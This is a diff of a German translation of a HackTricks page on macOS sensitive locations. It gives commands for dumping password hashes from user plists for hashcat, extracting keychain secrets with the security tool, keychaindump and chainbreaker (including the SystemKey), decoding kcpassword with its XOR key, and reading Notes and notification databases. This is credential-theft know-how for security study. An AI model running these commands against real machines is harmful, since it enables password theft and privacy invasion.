@@ -1,26 +1,26 @@
-# macOS Sensible Orte & Interessante Daemons
+# macOS Sensitive Locations & Interesting Daemons
 
 {% hint style="success" %}
-Lernen & üben Sie AWS-Hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Lernen & üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Unterstützen Sie HackTricks</summary>
+<summary>Support HackTricks</summary>
 
 * Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
 
 ## Passwörter
 
-### Shadow-Passwörter
+### Schattenpasswörter
 
-Das Shadow-Passwort wird zusammen mit der Benutzerkonfiguration in Plist-Dateien gespeichert, die sich in **`/var/db/dslocal/nodes/Default/users/`** befinden.\
-Mit dem folgenden Oneliner können **alle Informationen über die Benutzer** (einschließlich Hash-Informationen) abgerufen werden:
+Das Schattenpasswort wird mit der Konfiguration des Benutzers in Plists gespeichert, die sich in **`/var/db/dslocal/nodes/Default/users/`** befinden.\
+Der folgende Einzeiler kann verwendet werden, um **alle Informationen über die Benutzer** (einschließlich Hash-Informationen) zu dumpen:
 
 {% code overflow="wrap" %}
 ```bash
@@ -28,9 +28,9 @@ for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"
 ```
 {% endcode %}
 
-[**Skripte wie dieses hier**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) oder [**dieses hier**](https://github.com/octomagon/davegrohl.git) können verwendet werden, um den Hash in **hashcat-Format** umzuwandeln.
+[**Skripte wie dieses hier**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) oder [**dieses hier**](https://github.com/octomagon/davegrohl.git) können verwendet werden, um den Hash in **hashcat** **Format** zu transformieren.
 
-Ein alternativer One-Liner, der Anmeldeinformationen aller Nicht-Service-Konten im hashcat-Format `-m 7100` (macOS PBKDF2-SHA512) ausgibt:
+Eine alternative Einzeiler, die die Anmeldeinformationen aller Nicht-Dienstkonten im hashcat-Format `-m 7100` (macOS PBKDF2-SHA512) ausgibt:
 
 {% code overflow="wrap" %}
 ```bash
@@ -40,10 +40,10 @@ sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex
 
 ### Schlüsselbund-Dump
 
-Beachten Sie, dass bei der Verwendung des security-Binärs zum **Dumpen der entschlüsselten Passwörter** mehrere Aufforderungen den Benutzer auffordern, diese Operation zu erlauben.
+Beachten Sie, dass beim Verwenden der Sicherheits-Binärdatei, um **die entschlüsselten Passwörter zu dumpen**, mehrere Aufforderungen den Benutzer bitten, diese Operation zuzulassen.
 ```bash
 #security
-secuirty dump-trust-settings [-s] [-d] #List certificates
+security dump-trust-settings [-s] [-d] #List certificates
 security list-keychains #List keychain dbs
 security list-smartcards #List smartcards
 security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
@@ -57,22 +57,22 @@ Basierend auf diesem Kommentar [juuso/keychaindump#10 (Kommentar)](https://githu
 
 ### Keychaindump Übersicht
 
-Ein Tool namens **keychaindump** wurde entwickelt, um Passwörter aus macOS-Schlüsselbunden zu extrahieren, stößt jedoch auf Einschränkungen in neueren macOS-Versionen wie Big Sur, wie in einer [Diskussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) angegeben. Die Verwendung von **keychaindump** erfordert, dass der Angreifer Zugriff erhält und Berechtigungen auf **root**-Ebene eskaliert. Das Tool nutzt die Tatsache aus, dass der Schlüsselbund standardmäßig beim Benutzerlogin entsperrt ist, um Anwendungen den Zugriff darauf zu ermöglichen, ohne wiederholt das Passwort des Benutzers anzufordern. Wenn ein Benutzer jedoch entscheidet, den Schlüsselbund nach jeder Verwendung zu sperren, wird **keychaindump** wirkungslos.
+Ein Tool namens **keychaindump** wurde entwickelt, um Passwörter aus macOS-Schlüsselbunden zu extrahieren, hat jedoch Einschränkungen bei neueren macOS-Versionen wie Big Sur, wie in einer [Diskussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) angegeben. Die Verwendung von **keychaindump** erfordert, dass der Angreifer Zugriff erlangt und die Berechtigungen auf **root** eskaliert. Das Tool nutzt die Tatsache aus, dass der Schlüsselbund standardmäßig beim Benutzer-Login zur Bequemlichkeit entsperrt ist, was Anwendungen den Zugriff darauf ermöglicht, ohne das Passwort des Benutzers wiederholt eingeben zu müssen. Wenn ein Benutzer jedoch beschließt, seinen Schlüsselbund nach jeder Verwendung zu sperren, wird **keychaindump** unwirksam.
 
-**Keychaindump** arbeitet, indem es einen bestimmten Prozess namens **securityd** ins Visier nimmt, den Apple als Daemon für Autorisierungs- und kryptografische Operationen beschreibt, der für den Zugriff auf den Schlüsselbund unerlässlich ist. Der Extraktionsprozess beinhaltet die Identifizierung eines **Master Key**, der aus dem Anmeldepasswort des Benutzers abgeleitet ist. Dieser Schlüssel ist entscheidend für das Lesen der Schlüsselbunddatei. Um den **Master Key** zu lokalisieren, durchsucht **keychaindump** den Speicherheap von **securityd**, indem es den Befehl `vmmap` verwendet, um potenzielle Schlüssel in Bereichen zu finden, die als `MALLOC_TINY` markiert sind. Der folgende Befehl wird verwendet, um diese Speicherorte zu inspizieren:
+**Keychaindump** zielt auf einen bestimmten Prozess namens **securityd** ab, der von Apple als Daemon für Autorisierungs- und kryptografische Operationen beschrieben wird und entscheidend für den Zugriff auf den Schlüsselbund ist. Der Extraktionsprozess umfasst die Identifizierung eines **Master Key**, der aus dem Login-Passwort des Benutzers abgeleitet ist. Dieser Schlüssel ist entscheidend für das Lesen der Schlüsselbunddatei. Um den **Master Key** zu finden, scannt **keychaindump** den Speicherheap von **securityd** mit dem Befehl `vmmap` und sucht nach potenziellen Schlüsseln in Bereichen, die als `MALLOC_TINY` gekennzeichnet sind. Der folgende Befehl wird verwendet, um diese Speicherorte zu inspizieren:
 ```bash
 sudo vmmap <securityd PID> | grep MALLOC_TINY
 ```
-Nach Identifizierung potenzieller Master-Schlüssel durchsucht **keychaindump** die Heaps nach einem spezifischen Muster (`0x0000000000000018`), das auf einen Kandidaten für den Master-Schlüssel hinweist. Weitere Schritte, einschließlich der Entschleierung, sind erforderlich, um diesen Schlüssel zu nutzen, wie im Quellcode von **keychaindump** beschrieben. Analysten, die sich auf diesen Bereich konzentrieren, sollten beachten, dass die entscheidenden Daten zur Entschlüsselung des Schlüsselbunds im Speicher des **securityd**-Prozesses gespeichert sind. Ein Beispielbefehl zum Ausführen von **keychaindump** lautet:
+Nach der Identifizierung potenzieller Master-Schlüssel durchsucht **keychaindump** die Speicherhaufen nach einem bestimmten Muster (`0x0000000000000018`), das einen Kandidaten für den Master-Schlüssel anzeigt. Weitere Schritte, einschließlich Deobfuskation, sind erforderlich, um diesen Schlüssel zu nutzen, wie im Quellcode von **keychaindump** dargelegt. Analysten, die sich auf diesen Bereich konzentrieren, sollten beachten, dass die entscheidenden Daten zum Entschlüsseln des Schlüsselspeichers im Speicher des **securityd**-Prozesses gespeichert sind. Ein Beispielbefehl zum Ausführen von **keychaindump** ist:
 ```bash
 sudo ./keychaindump
 ```
 ### chainbreaker
 
-[**Chainbreaker**](https://github.com/n0fate/chainbreaker) kann verwendet werden, um die folgenden Arten von Informationen aus einem OSX-Schlüsselbund auf forensisch korrekte Weise zu extrahieren:
+[**Chainbreaker**](https://github.com/n0fate/chainbreaker) kann verwendet werden, um die folgenden Arten von Informationen aus einem OSX-Schlüsselbund auf forensisch einwandfreie Weise zu extrahieren:
 
-* Gehashtes Keychain-Passwort, geeignet zum Knacken mit [hashcat](https://hashcat.net/hashcat/) oder [John the Ripper](https://www.openwall.com/john/)
-* Internetpasswörter
+* Gehashtes Schlüsselbund-Passwort, geeignet zum Knacken mit [hashcat](https://hashcat.net/hashcat/) oder [John the Ripper](https://www.openwall.com/john/)
+* Internet-Passwörter
 * Generische Passwörter
 * Private Schlüssel
 * Öffentliche Schlüssel
@@ -80,16 +80,16 @@ sudo ./keychaindump
 * Sichere Notizen
 * Appleshare-Passwörter
 
-Mit dem Schlüsselbund-Entsperrpasswort, einem mit [volafox](https://github.com/n0fate/volafox) oder [volatility](https://github.com/volatilityfoundation/volatility) erhaltenen Master-Key oder einer Entsperrdatei wie SystemKey wird Chainbreaker auch Klartextpasswörter bereitstellen.
+Mit dem Schlüsselbund-Entsperrpasswort, einem Master-Schlüssel, der mit [volafox](https://github.com/n0fate/volafox) oder [volatility](https://github.com/volatilityfoundation/volatility) erhalten wurde, oder einer Entsperrdatei wie SystemKey, wird Chainbreaker auch Klartext-Passwörter bereitstellen.
 
 Ohne eine dieser Methoden zum Entsperren des Schlüsselbunds zeigt Chainbreaker alle anderen verfügbaren Informationen an.
 
-#### **Schlüsselbundschlüssel dumpen**
+#### **Dump keychain keys**
 ```bash
 #Dump all keys of the keychain (without the passwords)
 python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
 ```
-#### **Schlüsselbundschlüssel (mit Passwörtern) mit SystemKey auslesen**
+#### **Dump Schlüsselbund-Schlüssel (mit Passwörtern) mit SystemKey**
 ```bash
 # First, get the keychain decryption key
 # To get this decryption key you need to be root and SIP must be disabled
@@ -97,7 +97,7 @@ hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
 ## Use the previous key to decrypt the passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
-#### **Schlüsselbundschlüssel (mit Passwörtern) ausgeben und den Hash knacken**
+#### **Dump Schlüsselbund-Schlüssel (mit Passwörtern) Hash knacken**
 ```bash
 # Get the keychain hash
 python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
@@ -106,9 +106,9 @@ hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
 # Use the key to decrypt the passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
-#### **Dumpen von Schlüsseln im Schlüsselbund (mit Passwörtern) mit Speicherabbild**
+#### **Dump Schlüsselbund-Schlüssel (mit Passwörtern) mit Speicherabbild**
 
-[Befolgen Sie diese Schritte](../#dumping-memory-with-osxpmem), um ein **Speicherabbild** durchzuführen
+[Folgen Sie diesen Schritten](../#dumping-memory-with-osxpmem), um ein **Speicherabbild** durchzuführen.
 ```bash
 #Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
 # Unformtunately volafox isn't working with the latest versions of MacOS
@@ -117,19 +117,19 @@ python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump
 #Try to extract the passwords using the extracted keychain passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
-#### **Schlüsselbundschlüssel (mit Passwörtern) mithilfe des Benutzerpassworts ausgeben**
+#### **Dump keychain keys (with passwords) using users password**
 
-Wenn Sie das Benutzerpasswort kennen, können Sie es verwenden, um **Schlüsselbünde des Benutzers auszugeben und zu entschlüsseln**.
+Wenn Sie das Passwort des Benutzers kennen, können Sie es verwenden, um **Keychains, die dem Benutzer gehören, zu dumpen und zu entschlüsseln**.
 ```bash
 #Prompt to ask for the password
 python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
 ```
 ### kcpassword
 
-Die **kcpassword**-Datei ist eine Datei, die das **Anmeldepasswort des Benutzers** enthält, jedoch nur, wenn der Systembesitzer die **automatische Anmeldung aktiviert** hat. Daher wird der Benutzer automatisch angemeldet, ohne nach einem Passwort gefragt zu werden (was nicht sehr sicher ist).
+Die **kcpassword**-Datei ist eine Datei, die das **Login-Passwort des Benutzers** enthält, jedoch nur, wenn der Systembesitzer die **automatische Anmeldung** aktiviert hat. Daher wird der Benutzer automatisch angemeldet, ohne nach einem Passwort gefragt zu werden (was nicht sehr sicher ist).
 
-Das Passwort wird in der Datei **`/etc/kcpassword`** mit dem Schlüssel **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** xor-verknüpft. Wenn das Passwort des Benutzers länger als der Schlüssel ist, wird der Schlüssel wiederverwendet.\
-Dies macht das Passwort ziemlich einfach wiederherzustellen, zum Beispiel mit Skripten wie [**diesem hier**](https://gist.github.com/opshope/32f65875d45215c3677d). 
+Das Passwort wird in der Datei **`/etc/kcpassword`** mit dem Schlüssel **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** xored. Wenn das Passwort des Benutzers länger als der Schlüssel ist, wird der Schlüssel wiederverwendet.\
+Das macht es ziemlich einfach, das Passwort wiederherzustellen, zum Beispiel mit Skripten wie [**diesem**](https://gist.github.com/opshope/32f65875d45215c3677d).
 
 ## Interessante Informationen in Datenbanken
 
@@ -143,9 +143,9 @@ sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
 ```
 ### Benachrichtigungen
 
-Die Benachrichtigungsdaten finden Sie in `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`
+Sie finden die Benachrichtigungsdaten in `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`
 
-Die meisten interessanten Informationen werden im **Blob** sein. Sie müssen also diesen Inhalt **extrahieren** und ihn in ein **menschlich lesbares** Format **umwandeln** oder **`strings`** verwenden. Um darauf zuzugreifen, können Sie Folgendes tun:
+Die meisten interessanten Informationen befinden sich in **blob**. Sie müssen also diesen Inhalt **extrahieren** und in **menschlich** **lesbare** Form **transformieren** oder **`strings`** verwenden. Um darauf zuzugreifen, können Sie Folgendes tun:
 
 {% code overflow="wrap" %}
 ```bash
@@ -156,7 +156,7 @@ strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i
 
 ### Hinweise
 
-Die **Notizen** der Benutzer finden sich in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
+Die **Notizen** der Benutzer befinden sich in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
 
 {% code overflow="wrap" %}
 ```bash
@@ -169,19 +169,19 @@ for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.s
 
 ## Einstellungen
 
-In macOS befinden sich die Einstellungen von Apps in **`$HOME/Library/Preferences`** und in iOS in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.&#x20;
+In macOS-Apps befinden sich die Einstellungen in **`$HOME/Library/Preferences`** und in iOS sind sie in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.&#x20;
 
-In macOS kann das CLI-Tool **`defaults`** verwendet werden, um die Einstellungsdatei zu **ändern**.
+In macOS kann das CLI-Tool **`defaults`** verwendet werden, um die **Einstellungsdatei zu ändern**.
 
-**`/usr/sbin/cfprefsd`** beansprucht die XPC-Dienste `com.apple.cfprefsd.daemon` und `com.apple.cfprefsd.agent` und kann aufgerufen werden, um Aktionen wie das Ändern von Einstellungen auszuführen.
+**`/usr/sbin/cfprefsd`** beansprucht die XPC-Dienste `com.apple.cfprefsd.daemon` und `com.apple.cfprefsd.agent` und kann aufgerufen werden, um Aktionen wie das Ändern von Einstellungen durchzuführen.
 
 ## Systembenachrichtigungen
 
 ### Darwin-Benachrichtigungen
 
-Der Hauptdaemon für Benachrichtigungen ist **`/usr/sbin/notifyd`**. Um Benachrichtigungen zu empfangen, müssen Clients sich über den `com.apple.system.notification_center` Mach-Port registrieren (überprüfen Sie sie mit `sudo lsmp -p <pid notifyd>`). Der Daemon ist konfigurierbar mit der Datei `/etc/notify.conf`.
+Der Hauptdaemon für Benachrichtigungen ist **`/usr/sbin/notifyd`**. Um Benachrichtigungen zu empfangen, müssen sich Clients über den Mach-Port `com.apple.system.notification_center` registrieren (überprüfen Sie diese mit `sudo lsmp -p <pid notifyd>`). Der Daemon ist konfigurierbar mit der Datei `/etc/notify.conf`.
 
-Die Namen, die für Benachrichtigungen verwendet werden, sind eindeutige Reverse-DNS-Notationen, und wenn eine Benachrichtigung an eine von ihnen gesendet wird, erhalten die Client(s), die angegeben haben, dass sie damit umgehen können, diese.
+Die für Benachrichtigungen verwendeten Namen sind eindeutige Reverse-DNS-Notationen, und wenn eine Benachrichtigung an eine von ihnen gesendet wird, erhalten die Client(s), die angegeben haben, dass sie damit umgehen können, diese.
 
 Es ist möglich, den aktuellen Status zu dumpen (und alle Namen zu sehen), indem das Signal SIGUSR2 an den notifyd-Prozess gesendet und die generierte Datei gelesen wird: `/var/run/notifyd_<pid>.status`:
 ```bash
@@ -199,22 +199,22 @@ common: com.apple.CFPreferences._domainsChangedExternally
 common: com.apple.security.octagon.joined-with-bottle
 [...]
 ```
-### Verteilter Benachrichtigungsdienst
+### Distributed Notification Center
 
-Der **Verteilte Benachrichtigungsdienst**, dessen Hauptbinary **`/usr/sbin/distnoted`** ist, ist eine weitere Möglichkeit, Benachrichtigungen zu senden. Er stellt einige XPC-Dienste bereit und führt einige Überprüfungen durch, um Clients zu verifizieren.
+Das **Distributed Notification Center**, dessen Hauptbinary **`/usr/sbin/distnoted`** ist, ist eine weitere Möglichkeit, Benachrichtigungen zu senden. Es stellt einige XPC-Dienste zur Verfügung und führt einige Überprüfungen durch, um zu versuchen, die Clients zu verifizieren.
 
-### Apple Push-Benachrichtigungen (APN)
+### Apple Push Notifications (APN)
 
-In diesem Fall können Anwendungen sich für **Themen** registrieren. Der Client generiert ein Token, indem er Apples Server über **`apsd`** kontaktiert.\
-Dann werden auch Anbieter ein Token generiert haben und in der Lage sein, sich mit Apples Servern zu verbinden, um Nachrichten an die Clients zu senden. Diese Nachrichten werden lokal von **`apsd`** empfangen, der die Benachrichtigung an die darauf wartende Anwendung weiterleitet.
+In diesem Fall können Anwendungen sich für **Themen** registrieren. Der Client generiert ein Token, indem er die Server von Apple über **`apsd`** kontaktiert.\
+Dann haben die Anbieter ebenfalls ein Token generiert und können sich mit den Servern von Apple verbinden, um Nachrichten an die Clients zu senden. Diese Nachrichten werden lokal von **`apsd`** empfangen, das die Benachrichtigung an die wartende Anwendung weiterleitet.
 
 Die Einstellungen befinden sich in `/Library/Preferences/com.apple.apsd.plist`.
 
-Es gibt eine lokale Datenbank von Nachrichten in macOS unter `/Library/Application\ Support/ApplePushService/aps.db` und in iOS unter `/var/mobile/Library/ApplePushService`. Sie hat 3 Tabellen: `incoming_messages`, `outgoing_messages` und `channel`.
+Es gibt eine lokale Datenbank von Nachrichten, die sich in macOS in `/Library/Application\ Support/ApplePushService/aps.db` und in iOS in `/var/mobile/Library/ApplePushService` befindet. Sie hat 3 Tabellen: `incoming_messages`, `outgoing_messages` und `channel`.
 ```bash
 sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
 ```
-Es ist auch möglich, Informationen über den Daemon und Verbindungen mithilfe von:
+Es ist auch möglich, Informationen über den Daemon und die Verbindungen zu erhalten, indem man:
 ```bash
 /System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
 ```
@@ -222,6 +222,21 @@ Es ist auch möglich, Informationen über den Daemon und Verbindungen mithilfe v
 
 Dies sind Benachrichtigungen, die der Benutzer auf dem Bildschirm sehen sollte:
 
-- **`CFUserNotification`**: Diese API bietet eine Möglichkeit, auf dem Bildschirm ein Popup mit einer Nachricht anzuzeigen.
-- **Das Bulletin Board**: Dies zeigt auf iOS ein Banner an, das verschwindet und im Notification Center gespeichert wird.
-- **`NSUserNotificationCenter`**: Dies ist das Bulletin Board in MacOS. Die Datenbank mit den Benachrichtigungen befindet sich in `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`
+* **`CFUserNotification`**: Diese API bietet eine Möglichkeit, ein Pop-up mit einer Nachricht auf dem Bildschirm anzuzeigen.
+* **Das Bulletin Board**: Dies zeigt in iOS ein Banner, das verschwindet und im Benachrichtigungszentrum gespeichert wird.
+* **`NSUserNotificationCenter`**: Dies ist das iOS-Bulletin-Board in MacOS. Die Datenbank mit den Benachrichtigungen befindet sich in `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>Support HackTricks</summary>
+
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+
+</details>
+{% endhint %}
